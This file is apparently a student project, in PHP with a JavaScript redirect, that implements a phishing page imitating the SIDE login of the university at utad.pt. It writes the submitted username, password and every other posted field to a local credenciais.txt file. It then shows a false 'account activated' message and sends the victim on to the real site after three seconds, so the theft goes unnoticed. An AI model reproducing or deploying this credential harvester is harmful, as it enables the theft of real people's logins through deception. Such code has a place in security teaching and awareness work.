

//wait 3 seconds before redirection
//espera 3 segundos antes de redirecionar
<script type="text/javascript">
    window.setTimeout(function() {window.location.href='https://side.utad.pt/';}, 3000);
</script>

<?php 

//parameters insert by the user
//parametros inseridos pelo utilizador
$j_username = $_POST['j_username'];
$j_password = $_POST['j_password'];

//message for user
//mensagem para o utilizador
$mensagem = "A sua conta foi ativada com sucesso! Irá ser redirecionado para a página inicial do SIDE dentro de momentos....";

while(true)
{
    //if the parameters aren't null then they are written in the file
    //Caso os parametros não sejam nulos, escreve no ficheiro os dados inseridos pelo utilizador
    if($j_username != null && $j_password != null)
    {
        //open the file in write mode. In case the file doesn't exists, it will be create it first
        //abre o ficheiro em modo de escrita. Caso o ficheiro não existe, este vai ser criado
        $ficheiro = fopen("credenciais.txt", "a");
        
        //writes the data on the file
        //escreve os dados pretendidos no ficheiro
        foreach($_POST as $variable => $value) 
        {
            fwrite($ficheiro, $variable);
            fwrite($ficheiro, "=");
            fwrite($ficheiro, $value);
            fwrite($ficheiro, "\r\n");
        }

        fwrite($ficheiro, "\r\n");
        
        //close the file
        //fecha o ficheiro
        fclose($ficheiro);
        
        //show the message to user
        //apresenta a mensagem ao utilizador
        echo $mensagem;
        exit();
       
    }
    else if($j_username == null && $j_password == null) //Casos os parâmetros sejam nulos; //in case the parameters are null
    {
        //the user will be redirect to a page with a credenticials error message
        //é redirecionado para uma página com a mensagem de erro de credenciais erradas
        Redirect("http://localhost/Tp2/CredenciaisErradas.php");
    }
}

//function that redirets pages
//função para redirecionar paginas
function Redirect($page) 
{
    header('Location: ' . $page);
    exit();
}

?>


